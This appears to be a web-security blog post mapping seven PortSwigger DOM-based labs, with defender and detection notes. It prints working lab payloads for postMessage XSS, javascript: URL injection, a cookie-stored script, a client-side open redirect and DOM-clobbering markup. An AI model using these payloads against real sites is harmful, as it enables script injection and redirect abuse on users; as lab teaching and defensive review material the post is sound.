---
layout: post
title: "DOM Bugs Live in the Browser Runtime - A Seven-Lab Map"
date: 2026-06-15 09:30:00 +0800
categories: [web-security, methodology, detection-engineering]
tags: [dom-xss, postmessage, dom-clobbering, portswigger, browser-security]
related_posts:
  - xss-is-a-parser-boundary-problem
  - csrf-is-a-state-transition-bug
  - web-cache-deception-five-labs
---

DOM-based vulnerabilities are easy to miss in server-heavy reviews because the dangerous decision happens after the response is already in the browser.

The right model is:

**DOM bugs are source-to-sink bugs in the browser runtime.** The source may be a web message, `location`, a cookie, or the DOM itself. The sink may be `innerHTML`, `location.href`, an iframe `src`, or a sanitizer property that can be clobbered.

The seven PortSwigger DOM-based labs form a compact map.

## The map

| Lab group | Source | Sink |
|-----------|--------|------|
| web messages | `postMessage` | HTML, URL, JSON-dispatched iframe `src` |
| open redirect | `location` regex | `location.href` |
| cookie manipulation | product URL saved in cookie | homepage render |
| DOM clobbering | `id`/`name` in comments | global object and DOM properties |

## Web messages need both origin and schema checks

The first lab inserts message data into an ad container:

```html
<iframe src="https://LAB/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

The second lab writes message data to `location.href`, after only checking that the string contains `http:` or `https:`:

```html
<iframe src="https://LAB/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

The third parses JSON and routes `type=load-channel` to an iframe `src`:

```html
<iframe src=https://LAB/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

The common bug is not `postMessage` itself. It is accepting messages from any origin and letting fields reach dangerous sinks without schema and URL validation.

## Client-side redirects are still redirects

The open redirect lab is entirely client-side. A Back to Blog link extracts `url=https://...` from `location` and assigns it to `location.href`:

```text
https://LAB/post?postId=4&url=https://EXPLOIT/
```

This is still an open redirect. It can affect OAuth flows, phishing defenses, CSP navigation assumptions, and any feature that treats "same page first hop" as trustworthy.

## Cookies are client-side input

The cookie manipulation lab saves the last viewed product URL in a cookie and later renders it on the homepage.

The exploit first visits a product URL with script-bearing data, then navigates the victim back home:

```html
<iframe src="https://LAB/product?productId=1&'><script>print()</script>"
        onload="if(!window.x)this.src='https://LAB';window.x=1;">
```

The server did not need to store the payload. The browser stored it in a cookie. That does not make it trusted.

## DOM clobbering turns markup into state

The default-avatar lab uses a dangerous fallback:

```js
let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
```

Comment markup can create `window.defaultAvatar`:

```html
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```

Duplicate IDs create a collection; the named element becomes a property; the `avatar` value is then used as a URL. DOMPurify allowed `cid:`, and the quote is decoded at runtime.

The attribute-clobbering lab attacks the sanitizer integration:

```html
<form id=x tabindex=0 onfocus=print()><input id=attributes>
```

The `input id=attributes` shadows the form's `attributes` property. The filter's attribute loop breaks, preserving `onfocus`. A delayed fragment navigation focuses the form:

```html
<iframe src=https://LAB/post?postId=3
        onload="setTimeout(()=>this.src=this.src+'#x',500)">
```

DOM clobbering is a reminder that IDs and names are not just labels. In browsers, they can become properties.

## Defender notes

Review DOM code as a dataflow problem:

- list sources: `location`, `hash`, `postMessage`, cookies, storage, DOM nodes;
- list sinks: HTML, URL, script, iframe, redirect, sanitizer internals;
- verify `event.origin` and message schema before touching `event.data`;
- use exact `targetOrigin` for `postMessage`;
- parse URLs with `new URL()` and allowlist scheme, origin, and path;
- treat cookies and storage as untrusted input;
- avoid `window.<id>` globals and logical-OR fallbacks for security state;
- harden sanitizer integrations against `id`/`name` clobbering.

Detection ideas:

- message listeners without origin checks;
- `event.data` flowing into `innerHTML`, `location.href`, iframe `src`, or `eval`-like sinks;
- client-side redirects controlled by `url=`, `return=`, or `redirect=`;
- cookies containing script fragments or malformed URLs;
- comments with duplicate IDs, `name=avatar`, `id=attributes`, or `cid:` payloads.

The durable lesson is that browser runtime code is application code. It needs the same source-to-sink review as backend code.
